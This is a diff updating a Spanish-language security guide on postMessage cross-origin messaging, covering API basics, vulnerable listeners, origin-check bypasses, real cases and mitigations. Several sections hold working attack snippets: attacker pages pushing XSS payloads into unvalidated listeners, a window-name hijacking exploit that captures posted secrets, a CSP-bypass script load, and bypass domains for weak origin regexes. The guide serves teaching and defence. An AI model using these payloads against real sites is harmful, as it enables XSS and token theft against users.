@@ -1,291 +1,585 @@
-# PostMessage
+# PostMessage - Guía Completa de Comunicación Cross-Origin
 
-### ¿Qué es un `iframe`?
+PostMessage representa uno de los mecanismos más importantes y potencialmente peligrosos para la comunicación entre diferentes orígenes en aplicaciones web modernas. Esta API permite la transferencia segura de datos entre ventanas, iframes y workers, pero su implementación incorrecta puede abrir puertas a vulnerabilidades críticas.[^2]
 
-Un `iframe` (Inline Frame) es un elemento HTML que permite incrustar otro documento HTML (otra página web) dentro del documento HTML actual. La página embebida en el `iframe` puede ser de un origen completamente diferente al de la página que la aloja.
+## ¿Qué es un iframe?
 
-Esto crea una barrera natural debido a la Same-Origin Policy (SOP).
+Un iframe (Inline Frame) es un elemento HTML que permite incrustar otro documento HTML dentro del documento actual. La página embebida puede provenir de un origen completamente diferente, creando una barrera natural debido a la Same-Origin Policy (SOP).[^4][^5]
 
-### ¿Qué es `window.postMessage`?
-
-La API `window.postMessage()` proporciona un mecanismo para que objetos `Window` (como una página y un `iframe` embebido en ella, o dos ventanas/pestañas del navegador) puedan **comunicarse de forma segura entre sí incluso si provienen de orígenes diferentes**.
-
-Antes de `postMessage`, intentar acceder al contenido de un `iframe` de un origen distinto (o viceversa) resultaría en un error de seguridad en la consola del navegador, como: `Uncaught DOMException: Blocked a frame with origin "http://origen-a.com" from accessing a cross-origin frame.`
-
-**Componentes Clave de `postMessage` y la Comunicación Cross-Origin:**
-
-- **Origen (Origin):** Se define por la combinación de:
-
-  - Protocolo (e.g., `http`, `https`)
-  - Dominio (e.g., `ejemplo.com`, `sub.ejemplo.com`)
-  - Puerto (e.g., `80` para HTTP, `443` para HTTPS, `8080` para desarrollo) Si cualquiera de estos tres componentes difiere entre dos ventanas, se consideran de orígenes distintos.
-- **Sintaxis de Envío (`targetWindow.postMessage`)**:
-
+```html
+<iframe src="https://victima.com/content.html" id="miFrame"></iframe>
 ```
+
+Esta funcionalidad es esencial para integrar contenido de terceros como widgets de chat, sistemas de pago, mapas interactivos y publicidad, pero también introduce riesgos significativos de seguridad.
+
+## ¿Qué es window.postMessage?
+
+La API `window.postMessage()` proporciona un mecanismo seguro para que objetos Window puedan comunicarse entre sí, incluso cuando provienen de orígenes diferentes. Antes de postMessage, cualquier intento de acceder al contenido de un iframe de origen distinto resultaba en errores de seguridad.[^6]
+
+### Componentes Clave de postMessage
+
+**Origen (Origin):** Se define por la combinación de protocolo, dominio y puerto. Si cualquiera de estos difiere, se consideran orígenes distintos.[^6]
+
+**Sintaxis de Envío:**
+
+```javascript
 targetWindow.postMessage(message, targetOrigin, [transfer]);
 ```
 
+- `targetWindow`: Referencia al objeto window destino
+- `message`: Datos a enviar (debe ser clonables estructuralmente)
+- `targetOrigin`: Origen que debe tener targetWindow para recibir el mensaje
+- `[transfer]`: Objetos Transferable opcionales
+
+**Recepción de Mensajes:**
+
+```javascript
+window.addEventListener("message", (event) => {
+  // SIEMPRE validar event.origin
+  if (event.origin !== "https://origen-esperado.com") {
+    return;
+  }
+  // Procesar event.data de forma segura
+  console.log("Mensaje recibido:", event.data);
+});
 ```
 
-- `targetWindow`: Referencia al objeto `window` al que se enviará el mensaje (e.g., `iframeElement.contentWindow`, `window.parent`, `window.opener`, o una ventana abierta con `window.open`).
-    - `message`: El dato a enviar. Puede ser cualquier objeto JavaScript que pueda ser clonado estructuralmente (strings, números, arrays, objetos simples, etc.).
-    - `targetOrigin`: Especifica el origen que `targetWindow` debe tener para que el mensaje sea enviado. Es una medida de seguridad crucial.
-        - Si se establece un URI específico (e.g., `"https://ejemplo-seguro.com"`), el mensaje solo se enviará si el `targetWindow` coincide con ese origen.
-        - Si se establece `"*"` (wildcard), el mensaje se enviará sin importar el origen del `targetWindow`. **Esto es peligroso si el `message` contiene datos sensibles.**
-    - `[transfer]` (Opcional): Una secuencia de objetos `Transferable` cuya propiedad se transfiere al destino.
-- **Recepción de Mensajes (`window.addEventListener`)**:
-   
-    ```javascript
-    window.addEventListener("message", receiveMessage, false);
-  
-    function receiveMessage(event) {
-      // event.origin: El origen de la ventana que envió el mensaje. ¡SIEMPRE VALIDARLO!
-      // event.source: Referencia al objeto window que envió el mensaje.
-      // event.data: El objeto (mensaje) enviado por postMessage.
-  
-      // Ejemplo de validación de origen
-      if (event.origin !== "https://origen-esperado.com") {
-        console.warn("Mensaje recibido de origen no confiable:", event.origin);
-        return; // No procesar el mensaje
-      }
-  
-      // Procesar event.data de forma segura
-      console.log("Mensaje recibido:", event.data);
-    }
-    ```
-  
-    **Seguridad en la Recepción:**
-  
-    1. **Siempre validar `event.origin`**: Asegurarse de que el mensaje proviene de un origen esperado y confiable.
-    2. **Siempre validar y sanitizar `event.data`**: Tratar los datos recibidos como cualquier otra entrada de usuario no confiable. No usarlos directamente en funciones peligrosas (sinks) como `innerHTML`, `eval()`, etc.
+## Ejemplos Básicos de Comunicación
 
-### Ejemplo: Enviar Mensaje del `iframe` al Padre
+### Envío desde iframe al Padre
 
-**Código del `iframe` (e.g., `http://iframe-origin.com/pagina-iframe.html`):**
+**Código del iframe (iframe-origin.com):**
 
 ```html
-<button id="btnSendMessage">Enviar Mensaje al Padre</button>
+<button id="btnSendMessage">Enviar al Padre</button>
 <script>
-  document.getElementById("btnSendMessage").addEventListener("click", () => {
-    const mensaje = { info: "Hola desde el iframe!" };
-    // IMPORTANTE: Especificar el targetOrigin del padre para seguridad.
-    // Usar '*' solo si el mensaje no es sensible y el padre puede ser cualquier página.
-    window.parent.postMessage(mensaje, "https://parent-origin.com"); 
-    // Si el padre estuviera en http://localhost:3000, sería:
-    // window.parent.postMessage(mensaje, "http://localhost:3000");
-  });
+document.getElementById("btnSendMessage").addEventListener("click", () => {
+  const mensaje = { info: "Hola desde el iframe!" };
+  window.parent.postMessage(mensaje, "https://victima.com");
+});
 </script>
 ```
 
-**Página Principal (Padre) (e.g., `https://parent-origin.com/pagina-principal.html`):**
+**Página Principal (victima.com):**
 
 ```html
-<iframe src="http://iframe-origin.com/pagina-iframe.html" id="miIframe"></iframe>
+<iframe src="https://iframe-origin.com/content.html" id="miIframe"></iframe>
 <div id="respuesta">Esperando mensaje...</div>
 <script>
-  window.addEventListener("message", (event) => {
-    // 1. Validar el origen del mensaje
-    if (event.origin !== "http://iframe-origin.com") {
-      console.warn("Origen no permitido:", event.origin);
-      return;
-    }
-
-    // 2. Opcional: Validar que la fuente sea el iframe esperado
-    // if (event.source !== document.getElementById('miIframe').contentWindow) {
-    //   console.warn("Fuente no esperada.");
-    //   return;
-    // }
-
-    // 3. Procesar los datos de forma segura
-    console.log("Datos recibidos del iframe:", event.data);
-    document.getElementById("respuesta").textContent = "Mensaje del iframe: " + JSON.stringify(event.data);
-  });
+window.addEventListener("message", (event) => {
+  if (event.origin !== "https://iframe-origin.com") {
+    return;
+  }
+  document.getElementById("respuesta").textContent = 
+    "Mensaje: " + JSON.stringify(event.data);
+});
 </script>
 ```
 
-### Ejemplo: Enviar Mensaje del Padre al `iframe`
+### Envío desde Padre al iframe
 
-**Página Principal (Padre):**
+**Página Principal:**
 
 ```html
-<button id="btnEnviarAIframe">Enviar a Iframe</button>
-<iframe src="https://iframe-target.com/receptor.html" id="frameReceptor"></iframe>
-
+<button id="btnEnviar">Enviar a iframe</button>
+<iframe src="https://iframe-target.com/receptor.html" id="frame"></iframe>
 <script>
-document.getElementById("btnEnviarAIframe").addEventListener("click", () => {
-  const iframeWindow = document.getElementById('frameReceptor').contentWindow;
-  if (iframeWindow) {
-    const mensaje = { comando: 'ACTUALIZAR_DATOS', valor: 'Nuevos datos desde el padre' };
-    // IMPORTANTE: Especificar el targetOrigin del iframe.
-    iframeWindow.postMessage(mensaje, 'https://iframe-target.com');
+document.getElementById("btnEnviar").addEventListener("click", () => {
+  const iframe = document.getElementById('frame').contentWindow;
+  const mensaje = { comando: 'ACTUALIZAR', valor: 'Nuevos datos' };
+  iframe.postMessage(mensaje, 'https://iframe-target.com');
+});
+</script>
+```
+
+## Vulnerabilidades Críticas en postMessage
+
+Las vulnerabilidades postMessage han causado compromisos significativos en servicios de Microsoft, Zoho y otros proveedores importantes. Microsoft descubrió múltiples vulnerabilidades de alto impacto que permitían robo de tokens y escalada de privilegios.[^1]
+
+### Falta de Validación de Origen
+
+**Escenario Vulnerable:**
+
+```html
+<!-- Página víctima -->
+<iframe src="https://vulnerable-iframe.com/content.html" id="frame"></iframe>
+<input type="text" id="msgInput" value="<img src=x onerror=alert('XSS')>">
+<button id="btnRun">Enviar</button>
+<script>
+document.getElementById("btnRun").addEventListener("click", () => {
+  const iframe = document.getElementById('frame').contentWindow;
+  const mensaje = { 
+    tipo: 'htmlDinamico', 
+    contenido: document.getElementById('msgInput').value 
+  };
+  // VULNERABILIDAD: targetOrigin = '*'
+  iframe.postMessage(mensaje, '*');
+});
+</script>
+```
+
+**iframe Vulnerable:**
+
+```html
+<div id="messageContainer">Contenido inicial</div>
+<script>
+window.addEventListener("message", (event) => {
+  // VULNERABILIDAD: Sin validación de origen
+  // if (event.origin !== "https://victima.com") return;
+  
+  if (event.data && event.data.tipo === 'htmlDinamico') {
+    // VULNERABILIDAD: Uso directo de innerHTML
+    document.getElementById('messageContainer').innerHTML = event.data.contenido;
   }
 });
 </script>
 ```
 
-**Página del `iframe` (Receptor):**
+**Explotación por Atacante:**
 
 ```html
-<div id="mensajeRecibido">Esperando mensaje del padre...</div>
+<!-- https://atacante.com/exploit.html -->
+<iframe src="https://vulnerable-iframe.com/content.html" id="target"></iframe>
 <script>
-  window.addEventListener("message", (event) => {
-    // 1. Validar origen del padre
-    if (event.origin !== "https://parent-origin.com") { // Asumiendo que el padre está en parent-origin.com
-      console.warn("Origen del padre no permitido:", event.origin);
-      return;
-    }
-
-    // 2. Procesar datos de forma segura
-    console.log("Datos recibidos del padre:", event.data);
-    if (event.data && event.data.hasOwnProperty('comando')) {
-      document.getElementById("mensajeRecibido").textContent = 
-        `Comando: ${event.data.comando}, Valor: ${event.data.valor}`;
-    }
-  });
+window.onload = () => {
+  const iframe = document.getElementById('target').contentWindow;
+  const payload = "<img src=x onerror=alert('XSS por atacante.com')>";
+  const mensaje = { tipo: 'htmlDinamico', contenido: payload };
+  iframe.postMessage(mensaje, "https://vulnerable-iframe.com");
+};
 </script>
 ```
 
-### Explotando `postMessage` para XSS (Cross-Site Scripting)
+### Robo de Tokens a Través de postMessage
 
-Una vulnerabilidad `postMessage` ocurre cuando un receptor (listener) no valida correctamente el `event.origin` y/o procesa el `event.data` de forma insegura.
+Microsoft identificó casos donde tokens de autenticación eran enviados sin validación de origen:[^1]
 
-**Escenario Vulnerable:**
-
-**Página Principal (Padre) (e.g., `https://vulnerable-parent.com`):**
-
-```html
-<iframe src="https://vulnerable-iframe.com/iframe_content.html" id="frame"></iframe><br>
-<input type="text" id="msgInput" value="<img src=x onerror=alert('XSS en iframe desde el padre')>">
-<button id="btnRun">Enviar al Iframe</button>
-<script>
-document.getElementById("btnRun").addEventListener("click", () => {
-  const iframe = document.getElementById('frame').contentWindow;
-  const mensaje = { tipo: 'htmlDinamico', contenido: document.getElementById('msgInput').value };
-  // VULNERABILIDAD EN EL EMISOR: Usa targetOrigin = '*'
-  // Si vulnerable-iframe.com fuera secuestrado o el iframe se redirigiera, se enviaría info a un sitio malicioso.
-  iframe.postMessage(mensaje, '*'); 
-});
-</script>
+```javascript
+// Código vulnerable encontrado en Bing Travel
+this.recorderModalIframe.contentWindow.postMessage(
+  {accessToken: this.userAuthJwt}, 
+  "*" // Wildcard peligroso
+);
 ```
 
-**`iframe` Vulnerable (e.g., `https://vulnerable-iframe.com/iframe_content.html`):**
+Un atacante puede interceptar estos tokens creando un iframe malicioso que escuche estos mensajes.[^1]
 
-```html
-<div id="messageContainer">Contenido inicial</div>
-<script>
-  window.addEventListener("message", (event) => {
-    // VULNERABILIDAD EN EL RECEPTOR (Falta de validación de event.origin):
-    // Acepta mensajes de cualquier origen.
-    // if (event.origin !== "https://vulnerable-parent.com") return; // ESTA VALIDACIÓN FALTA
+### Ataques Avanzados: Window Name Hijacking
 
-    // VULNERABILIDAD EN EL RECEPTOR (Uso inseguro de event.data):
-    // Inserta HTML directamente desde event.data sin sanitizar.
-    if (event.data && event.data.tipo === 'htmlDinamico') {
-      document.getElementById('messageContainer').innerHTML = event.data.contenido; // SINK PELIGROSO
-    }
-  });
-</script>
+Esta técnica explota ventanas con nombres predecibles:[^8]
+
+**Página Vulnerable:**
+
+```javascript
+function start() {
+  w = window.open("/win", "PREDICTABLE_NAME", "popup");
+  setTimeout(() => {
+    w.postMessage("SECRET_DATA", "*")
+  }, 1000)
+}
 ```
 
 **Explotación:**
 
-1. Un atacante crea su propia página (`https://attacker.com/exploit.html`) que embebe el `iframe` vulnerable:
-
 ```html
- <iframe src="https://vulnerable-iframe.com/iframe_content.html" id="targetIframe"></iframe>
-  <script>
-  window.onload = () => {
-  const iframeWin = document.getElementById('targetIframe').contentWindow;
-   const xssPayload = "<img src=x onerror=alert('XSS en iframe por attacker.com: ' + document.domain)>";
-  const maliciousMessage = { tipo: 'htmlDinamico', contenido: xssPayload };
-
- // El atacante envía el mensaje malicioso. Como el iframe no valida event.origin, lo acepta.
- iframeWin.postMessage(maliciousMessage, "https://vulnerable-iframe.com"); // targetOrigin es el del iframe
-   };
- </script>
+<iframe src="https://victima.com/%00" name="PREDICTABLE_NAME"></iframe>
+<script>
+onclick = () => {
+  window.open("https://victima.com");
+  frame.onload = () => {
+    frame.srcdoc = `<script>
+      onmessage = (e) => alert('Robado: ' + e.data)
+    <\/script>`;
+  };
+};
+</script>
 ```
 
-2. Cuando una víctima visita `https://attacker.com/exploit.html`, el script del atacante envía el payload XSS al `iframe` vulnerable.
-3. El `iframe` recibe el mensaje, no valida el origen (`attacker.com`), y usa `innerHTML` para insertar el payload, ejecutando el XSS en el contexto de `vulnerable-iframe.com`.
+## Problemas en Validación de Origen
 
-**Otros Sinks Peligrosos para `event.data`:**
+### Validaciones Incorrectas Comunes
 
-- `document.write(event.data.html)`
-- `element.setAttribute("href", event.data.url)` (si `event.data.url` es `javascript:...`)
-- `eval(event.data.codigoJs)`
-- `new Function(event.data.codigoJs)()`
-- Pasar `event.data` a librerías que dinámicamente crean HTML (e.g., jQuery `$(...).html(event.data)`).
-
-### Problemas Comunes en la Validación de Origen
-
-Incluso cuando los desarrolladores intentan validar `event.origin`, pueden cometer errores:
-
-1. **No Validar en Absoluto:** Aceptar mensajes de cualquier origen (como en el ejemplo anterior).
-2. **Uso Incorrecto de `startsWith`, `endsWith`, o `includes` (`indexOf`):**
-   - `if (event.origin.startsWith("https://confiable.com"))`
-     - Bypass: `https://confiable.com.atacante.com` (el atacante crea este dominio).
-   - `if (event.origin.endsWith(".confiable.com"))`
-     - Bypass: `https://cualquiercosa.confiable.com` (si el atacante puede controlar/registrar un subdominio) o `https://otrodominio.confiable.com.atacante.com`.
-   - `if (event.origin.includes("confiable.com"))`
-     - Bypass: `https://atacante-confiable.com.net`
-3. **Expresiones Regulares (RegEx) Débiles o Mal Formadas:**
-   - Ejemplo del usuario: `if (/(http:|https:)\/\/([a-z0-9.]{1,}).ctfio.com/.test(event.origin)) {}`
-     - Problema: Falta el anclaje de fin de string (`$`). La regex busca que el origen _contenga_ un subdominio de `.ctfio.com`, pero no que _termine_ exactamente ahí.
-     - Bypass: `http://sub.ctfio.com.atacante.com` (coincide con la regex porque "https://www.google.com/search?q=sub.ctfio.com" está presente).
-     - Regex más segura: `if (/^https?:\/\/([a-z0-9-]+\.)*ctfio\.com$/i.test(event.origin)) {}` (con anclajes `^` y `$`, y `i` para case-insensitive si es necesario).
-4. **Validación de Esquema o Puerto Incorrecta:**
-   - Olvidar validar el protocolo (permitiendo `http` cuando solo se espera `https`) o el puerto.
-5. **Confiar en `event.source` sin validar `event.origin`:** `event.source` puede ser útil para verificar si el mensaje proviene de un iframe específico que la página padre creó, pero `event.origin` sigue siendo la principal fuente de verdad para la seguridad del origen.
-
-### Otros Escenarios de Explotación
-
-- **Robo de Mensajes Sensibles:** Si una ventana padre escucha mensajes y actualiza su DOM o estado, pero no valida `event.origin` correctamente, un iframe malicioso podría enviar mensajes falsos. O, si una ventana hija envía datos sensibles al padre usando `targetOrigin = '*'`, una página padre maliciosa (o una página padre comprometida) podría interceptarlos.
-- **Disparar Acciones No Deseadas:** Si el manejador de mensajes (`message handler`) realiza acciones privilegiadas o modifica el estado de la aplicación basándose en el `event.data` sin validar suficientemente el origen y los datos.
-- **Clickjacking con `postMessage`:** Un atacante podría usar un iframe invisible sobre una página de la víctima y, mediante `postMessage`, enviar información sobre la interacción del usuario (como coordenadas del ratón) a un iframe malicioso de origen diferente para realizar acciones no deseadas.
-
-### Metodología de Descubrimiento y Testeo
-
-1. **Identificar Uso de `postMessage`:**
-   - Buscar en el código JavaScript (frontend):
-     - `window.addEventListener("message", ...)` o `$(window).on("message", ...)` (para listeners).
-     - `targetWindow.postMessage(...)` (para emisores).
-2. **Analizar los Listeners (`addEventListener("message", handlerFunction)`):**
-   - **¿Se valida `event.origin`?** ¿Cómo? ¿Es la validación robusta?
-   - **¿Se valida `event.source`?** (Menos común, pero puede ser relevante).
-   - **¿Qué se hace con `event.data`?** ¿Se pasa a sinks peligrosos (`innerHTML`, `eval`, `document.write`, `setAttribute` con `javascript:`, etc.)? ¿Se usa para tomar decisiones de lógica de negocio?
-3. **Analizar los Emisores (`postMessage(message, targetOrigin)`):**
-   - **¿Se usa `targetOrigin = '*'`?** Si es así, ¿es el `message` sensible? Si lo es, esto es una fuga de información si la ventana receptora puede ser controlada por un atacante (e.g., si el `src` de un iframe es controlable).
-   - ¿Es el `targetOrigin` específico y correcto?
-4. **Pruebas Dinámicas con Herramientas de Desarrollador del Navegador:**
-   - **Consola:** Puedes seleccionar un iframe (`document.getElementById('miIframe').contentWindow`) y enviarle mensajes de prueba:
+**1. Uso Incorrecto de startsWith/endsWith:**
 
 ```javascript
-  // Desde la consola del padre, enviar al iframe:
-   let iframeWin = document.getElementById('miIframe').contentWindow;
-iframeWin.postMessage({test: "hola iframe"}, "https://origen-del-iframe.com");
-   
-  // Desde la consola del iframe, enviar al padre:
-  window.parent.postMessage({test: "hola padre"}, "https://origen-del-padre.com");
+// VULNERABLE
+if (event.origin.startsWith("https://confiable.com")) {
+  // Bypass: https://confiable.com.atacante.com
+}
+
+// VULNERABLE  
+if (event.origin.endsWith(".confiable.com")) {
+  // Bypass: https://cualquiera.confiable.com.atacante.com
+}
 ```
 
-- **pestaña "Sources" (Fuentes):** Poner breakpoints dentro de los manejadores de eventos `message` para inspeccionar `event.origin`, `event.source`, y `event.data` en tiempo real.
+**2. Expresiones Regulares Débiles:**
 
-5. **Uso de Extensiones de Navegador o Proxies:**
-   - Extensiones como "Posta" (Chrome) o "PMHook" (integrable con Burp) pueden ayudar a interceptar, visualizar y modificar mensajes `postMessage`.
+```javascript
+// VULNERABLE - Falta anclaje de fin
+if (/(http:|https:)\/\/([a-z0-9.]{1,}).ctfio.com/.test(event.origin)) {
+  // Bypass: http://sub.ctfio.com.atacante.com
+}
 
-### Buenas Prácticas y Mitigaciones
+// CORRECTO
+if (/^https?:\/\/([a-z0-9-]+\.)*ctfio\.com$/i.test(event.origin)) {
+  // Anclajes ^ y $ previenen bypasses
+}
+```
 
-**Para el Emisor (quien llama a `postMessage`):**
+**3. Uso de includes():**
 
-1. **Siempre especificar un `targetOrigin` lo más preciso posible.** Evitar `"*"` si el mensaje contiene cualquier información sensible o si la acción que desencadena es privilegiada. Si el mensaje es verdaderamente público y no sensible, `"*"` puede ser aceptable, pero es mejor ser específico.
+```javascript
+// VULNERABLE
+if (event.origin.includes("confiable.com")) {
+  // Bypass: https://atacante-confiable.com.net
+}
+```
 
-**Para el Receptor (quien escucha el evento `message`):**
+## Ataques Reales Documentados
 
-1. **Validar `event.origin` rigurosamente:** Mantener una lista blanca de orígenes permitidos y comparar `event.origin` exactamente con esta lista. No usar `startsWith`, `endsWith`, o `includes` de forma laxa. Validar esquema, dominio y puerto.
-2. **(Opcional) Validar `event.source`:** Si se espera un mensaje de un iframe específico que la página actual ha creado, se puede comparar `event.source` con `miIframeElement.contentWindow`. Esto añade una capa extra, pero la validación de `event.origin` es la principal.
-3. **Tratar `event.data` como input no confiable:**
-   - **No insertar HTML directamente:** Usar `element.textContent = event.data.texto` en lugar de `element.innerHTML = event.data.textoSiConfiaraEnEl`.
-   - Si se debe insertar HTML, sanitizarlo usando una librería robusta y bien probada (e.g., DOMPurify).
-   - Si se espera JSON, parsearlo de forma segura (e.g., `JSON.parse(event.data)` dentro de un try-catch) y luego validar la estructura y los tipos de datos del objeto resultante.
-   - Nunca pasar `event.data` directamente a `eval()`, `new Function()`, `setTimeout("string")`, `setAttribute("href", "javascript:...")`, etc.
-4. **Ser explícito sobre el formato del mensaje esperado:** Verificar que `event.data` tenga la estructura y los campos esperados (e.g., `if (event.data && event.data.type === 'accionEspecifica' && typeof event.data.payload === 'string') { ... }`).
+### Caso Microsoft Teams[^1]
+
+Microsoft descubrió vulnerabilidades XSS 1-click y 0-click en Teams relacionadas con configuraciones postMessage permisivas. Las aplicaciones tenían `isFullTrust: true` y listas `validDomains` demasiado amplias.
+
+### Caso Zoho[^7]
+
+Zoho experimentó dos vulnerabilidades XSS críticas por manejo inseguro de postMessage, afectando múltiples aplicaciones y resultando en bounties de \$250 cada una.
+
+### OAuth Token Theft[^9]
+
+Investigadores demostraron cómo interceptar tokens OAuth explotando listeners postMessage débiles que filtran `location.href`, permitiendo robo de códigos de autorización.
+
+## Técnicas de Explotación Avanzadas
+
+### DOM XSS via postMessage[^11]
+
+```html
+<!-- Payload de explotación -->
+<iframe src="https://target-lab.net/" 
+        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+</iframe>
+```
+
+### CSP Bypass con postMessage[^13]
+
+PostMessage puede utilizarse para bypassear CSP cuando se combina con otras técnicas:
+
+```javascript
+// Si CSP permite 'self' y existe upload de archivos
+frame.postMessage({
+  type: 'loadScript',
+  src: '/uploads/malicious.js'
+}, '*');
+```
+
+### CSRF Sofisticado[^14]
+
+PostMessage puede facilitar ataques CSRF sofisticados embebiendo sitios vulnerables en iframes y enviando mensajes para desencadenar acciones no deseadas.
+
+## Sumideros Peligrosos (Dangerous Sinks)
+
+Cuando `event.data` se pasa a estos sumideros sin sanitización:[^6]
+
+- `element.innerHTML = event.data`
+- `document.write(event.data)`
+- `eval(event.data)`
+- `element.setAttribute("href", event.data)` (si contiene `javascript:`)
+- `new Function(event.data)()`
+- Librerías que crean HTML dinámicamente: `$(element).html(event.data)`
+
+## Metodología de Descubrimiento
+
+### Identificación de PostMessage
+
+1. **Buscar en código JavaScript:**
+   - `window.addEventListener("message", ...)`
+   - `targetWindow.postMessage(...)`
+   - `$(window).on("message", ...)`
+2. **Analizar Listeners:**
+   - ¿Se valida `event.origin`?
+   - ¿Cómo se valida?
+   - ¿Qué se hace con `event.data`?
+3. **Analizar Emisores:**
+   - ¿Se usa `targetOrigin = '*'`?
+   - ¿Es el mensaje sensible?
+
+### Herramientas de Testing
+
+**DOM Invader (Burp Suite):**[^16]
+
+- Identifica automáticamente mensajes explotables
+- Proporciona stack traces para debugging
+- Permite envío de mensajes modificados
+
+**Extensiones de Navegador:**
+
+- **PMHook:** Intercepta mensajes postMessage
+- **Posta:** Chrome extension para análisis postMessage
+
+**Testing Manual con DevTools:**
+
+```javascript
+// Desde consola del padre
+let iframe = document.getElementById('miIframe').contentWindow;
+iframe.postMessage({test: "payload"}, "https://target.com");
+
+// Desde consola del iframe
+window.parent.postMessage({test: "payload"}, "https://parent.com");
+```
+
+## Mitigaciones y Mejores Prácticas
+
+### Para Emisores (postMessage)
+
+1. **Especificar targetOrigin preciso:**
+
+```javascript
+// CORRECTO
+iframe.postMessage(mensaje, "https://trusted-domain.com");
+
+// EVITAR (solo si el mensaje es público)
+iframe.postMessage(mensaje, "*");
+```
+
+### Para Receptores (addEventListener)
+
+1. **Validación rigurosa de origen:**
+
+```javascript
+window.addEventListener("message", (event) => {
+  // Lista blanca de orígenes permitidos
+  const allowedOrigins = [
+    "https://trusted1.com",
+    "https://trusted2.com"
+  ];
+  
+  if (!allowedOrigins.includes(event.origin)) {
+    console.warn("Origen no permitido:", event.origin);
+    return;
+  }
+  
+  // Procesar mensaje de forma segura
+});
+```
+
+2. **Sanitización de datos:**
+
+```javascript
+// CORRECTO - Usar textContent
+element.textContent = event.data.message;
+
+// CORRECTO - Sanitizar HTML si es necesario
+const clean = DOMPurify.sanitize(event.data.html);
+element.innerHTML = clean;
+
+// EVITAR - Inserción directa
+element.innerHTML = event.data.html; // Peligroso
+```
+
+3. **Validación de estructura de mensaje:**
+
+```javascript
+window.addEventListener("message", (event) => {
+  if (event.origin !== "https://trusted.com") return;
+  
+  // Validar estructura esperada
+  if (!event.data || 
+      typeof event.data.type !== 'string' ||
+      typeof event.data.payload !== 'string') {
+    return;
+  }
+  
+  // Procesar solo tipos de mensaje conocidos
+  switch(event.data.type) {
+    case 'ALLOWED_ACTION':
+      handleAllowedAction(event.data.payload);
+      break;
+    default:
+      console.warn("Tipo de mensaje no reconocido:", event.data.type);
+  }
+});
+```
+
+### Iframe Sandboxing[^17]
+
+```html
+<iframe src="https://untrusted.com" 
+        sandbox="allow-scripts allow-same-origin">
+</iframe>
+```
+
+### Content Security Policy
+
+```http
+Content-Security-Policy: 
+  default-src 'self'; 
+  frame-src 'self' https://trusted-domains.com;
+  script-src 'self' 'nonce-random123';
+```
+
+## Prevención en Frameworks Modernos
+
+### React
+
+```jsx
+// Validación segura en React
+useEffect(() => {
+  const handleMessage = (event) => {
+    if (event.origin !== 'https://trusted.com') return;
+  
+    // Usar estado local para actualizar componente
+    setMessage(event.data.text); // React escapa automáticamente
+  };
+  
+  window.addEventListener('message', handleMessage);
+  return () => window.removeEventListener('message', handleMessage);
+}, []);
+```
+
+### Angular
+
+```typescript
+@Component({...})
+export class SecureComponent {
+  @HostListener('window:message', ['$event'])
+  handleMessage(event: MessageEvent) {
+    if (event.origin !== 'https://trusted.com') return;
+  
+    // Angular sanitiza automáticamente
+    this.message = event.data.text;
+  }
+}
+```
+
+## Consideraciones para Bug Bounty
+
+Al buscar vulnerabilidades postMessage:
+
+1. **Enfócate en aplicaciones complejas** con múltiples iframes
+2. **Revisa OAuth flows** que usen postMessage para comunicación
+3. **Prueba diferentes encodings** y payloads de bypass
+4. **Combina con otras vulnerabilidades** como CSP bypass o CSRF
+5. **Busca en funcionalidades de terceros** como widgets de chat, pagos
+
+## Casos de Alto Impacto
+
+PostMessage sigue siendo un vector de ataque crítico en 2024, especialmente en:
+
+- **Aplicaciones empresariales** con integración de múltiples servicios
+- **Plataformas OAuth** que manejan tokens sensibles
+- **SaaS applications** con widgets embebidos
+- **Aplicaciones bancarias** con componentes de terceros
+
+La clave para una explotación exitosa está en identificar la ausencia de validación de origen y encontrar sumideros peligrosos donde `event.data` se procesa sin sanitización. Microsoft y Zoho son ejemplos recientes de cómo estas vulnerabilidades pueden tener impacto real en aplicaciones de producción.
+
+Para los desarrolladores, la implementación de validación estricta de origen, sanitización de datos y el uso de frameworks seguros son fundamentales para prevenir estos ataques. Para los bug bounty hunters, comprender los patrones de comunicación cross-origin y las técnicas de evasión modernas es esencial para identificar vulnerabilidades que los scanners automatizados pueden pasar por alto.
+<span style="display:none">[^19][^21][^23][^25][^27][^29][^31][^33][^35][^37][^39][^41][^43][^45][^47][^49][^51][^53]</span>
+
+<div style="text-align: center">PostMessage - Guía Completa de Comunicación Cross-Origin</div>
+
+[^1]: https://msrc.microsoft.com/blog/2025/08/postmessaged-and-compromised/
+    
+[^2]: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
+    
+[^3]: https://stackoverflow.com/questions/2187103/xss-security-communication-between-2-iframes-from-the-same-domain
+    
+[^4]: https://www.radware.com/cyberpedia/application-security/iframe-injection-xss/
+    
+[^5]: https://qrvey.com/blog/iframe-security/
+    
+[^6]: https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
+    
+[^7]: https://infosecwriteups.com/behind-the-message-two-critical-xss-vulnerabilities-in-zohos-web-applications-86aa42887129
+    
+[^8]: https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation
+    
+[^9]: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
+    
+[^10]: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
+    
+[^11]: https://cqr.company/web-vulnerabilities/dom-xss-using-web-messages/
+    
+[^12]: https://www.browserstack.com/guide/csp-bypass
+    
+[^13]: https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/
+    
+[^14]: https://secinfodb.wordpress.com/2016/06/11/postmessage-sophisticated-csrf/
+    
+[^15]: https://trustfoundry.net/2024/07/30/a-quick-introduction-to-postmessage-xss/
+    
+[^16]: https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/web-message-dom-xss
+    
+[^17]: https://web.dev/articles/sandboxed-iframes
+    
+[^18]: https://www.less-secure.com/p/cross-origin-attacks-types-examples.html
+    
+[^19]: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
+    
+[^20]: https://abrictosecurity.com/attacks-you-should-know-about-cross-origin-resource-sharing/
+    
+[^21]: https://cybercx.com.au/blog/post-message-vulnerabilities/
+    
+[^22]: https://www.reflectiz.com/blog/iframe-security/
+    
+[^23]: https://akimbocore.com/article/html5-cross-domain-messaging-postmessage-vulnerabilities/
+    
+[^24]: https://nvd.nist.gov/vuln/detail/CVE-2024-10858
+    
